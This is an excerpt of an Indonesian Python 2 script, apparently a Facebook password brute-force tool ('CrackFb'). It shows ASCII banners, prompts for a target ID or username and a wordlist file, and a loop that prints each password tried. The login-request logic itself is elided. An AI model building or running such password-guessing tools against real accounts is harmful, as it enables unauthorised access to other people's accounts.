...
def banner():
    os.system('clear')
    runntxt(R+"       by riskiyans             ")
    runntxt(WW+" ╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─")
    runntxt(WW+" ╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐")
    runntxt(BB+" ╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴""\033[31mv1.3")
    runntxt(YY+"____________________________")
    runntxt(WW+" ")
    runntxt(R+"GUNAKAN TOOLS INI DENGAN BIJAK")
    runntxt(YY+"* " "\033[0;1mAuthor""\033[96;1m : Riski ")
    runntxt(YY+"* " "\033[0;1mChanel""\033[96;1m : CHANEL RNz")
    runntxt(YY+"* " "\033[0;1mGithub""\033[96;1m : https://github.com/riskiyana")
    runntxt(YY+"____________________________")
    time.sleep(1.5)
banner()
print
print R+"[\033[0;1m Masukkan ID\033[0;1m/ \033[34;1mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"=\033[93m  "))
print " "
print R+"[\033[0;1mMasukkan File Wordlist \033[31m( pass.txt ) \033[31m]"
password_list = str(raw_input(GL+"=\033[93m "))
...
def edit_wordlist():
        ...
        print GL+" "
        ed = str(raw_input("[?] MAU NAMBAH PASSWORD GA .? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
...
def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[0;1m"+email_target+"\033[31m]\033[36;1m Mencoba ==> \033[0;1m"+iqbalz_password)
	sys.stdout.flush()
...
def runn_noobs():
         ...
         print (R+"    ______                __   ________   ")
         print (R+"   / ____/________ ______/ /__/ ____/ /_  ")
         print (R+"  / /   / ___/ __ `/ ___/ //_/ /_  / __ \ ")
         print (WW+" / /___/ /  / /_/ / /__/ ,< / __/ / /_/ / ")
         print (WW+" \____/_/   \__,_/\___/_/|_/_/   /_.___/  ")

         print '\033[31mby riskiyans'
         print
         print
